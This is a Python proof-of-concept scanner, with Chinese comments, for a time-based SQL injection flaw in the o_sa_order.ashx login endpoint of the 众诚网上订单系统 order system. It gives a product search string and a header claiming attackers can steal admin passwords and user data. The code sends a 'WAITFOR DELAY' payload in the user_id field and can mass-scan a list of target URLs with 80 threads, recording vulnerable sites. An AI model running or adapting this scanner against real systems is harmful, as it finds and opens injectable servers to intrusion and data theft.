# 众诚网上订单系统 o_sa_order.ashx SQL注入漏洞 
# title="众诚网上订单系统"
# 产品简介:众诚网上订单系统通过集成互联网技术和先进的管理思想，为生产制造企业、多分销渠道的批零兼营、各类商贸批发业务提供了一站式的订单管理解决方案。该系统支持电脑PC、平板、手机APP同步操作，实现了订单、商品、客户、资金、信息、支付、物流和电子商务的全方位连接，极大地提升了企业的运营效率和管理水平。
# 漏洞概述:众诚网上订单系统 o_sa_order.ashx 存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
# POST/SQL延时注入

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def bunner():
    test = """                                                            
                    \x1b[38m███████╗      ██████╗
                    \x1b[36m╚══███╔╝     ██╔════╝
                    \x1b[34m  ███╔╝█████╗██║     
                    \x1b[35m ███╔╝ ╚════╝██║     
                    \x1b[31m███████╗     ╚██████╗
                    \x1b[33m╚══════╝      ╚═════╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    --author:Kucei  --Vession:众诚网上订单系统 o_sa_order.ashx SQL注入漏洞
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    bunner()
    # 初始化
    parser = argparse.ArgumentParser("众诚网上订单系统 o_sa_order.ashx SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 创建一个列表接收 文件夹的URL
        url_list = []
        with open(args.file,'r') as fp:
            # 遍历文件夹内的URL
            for url in fp.readlines():
                # append 往列表添加元素
                url_list.append(url.strip())
        # 创建线性池
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else :
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    url_payload = "/ajax/o_sa_order.ashx"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0', 
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'keep-alive',
        'Priority': 'u=0',
    }
    data1 = "type=login&user_id=1&user_pwd=1"
    data2 = "type=login&user_id=1%27);WAITFOR%20DELAY%20%270:0:5%27--&user_pwd=1"
    try :
        response1 = requests.post(url=target+url_payload,headers=headers,data=data1,verify=False,timeout=5)
        response2 = requests.post(url=target+url_payload,headers=headers,data=data2,verify=False,timeout=5)
        # print(response.status_code)
        # print(response.text)
        time1 = response1.elapsed.total_seconds()
        time2 = response2.elapsed.total_seconds()
        if response1.status_code == 200 and time2 - time1 >= 4.5:
            print( f"[+] {target} 存在漏洞")
            with open('众诚网上订单系统-o_sa_order-SQL.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
        else:
            print(f"[-]{target}不存在漏洞")
    except :
        print(target+"--站点连接异常--")
if __name__ == '__main__':
    main()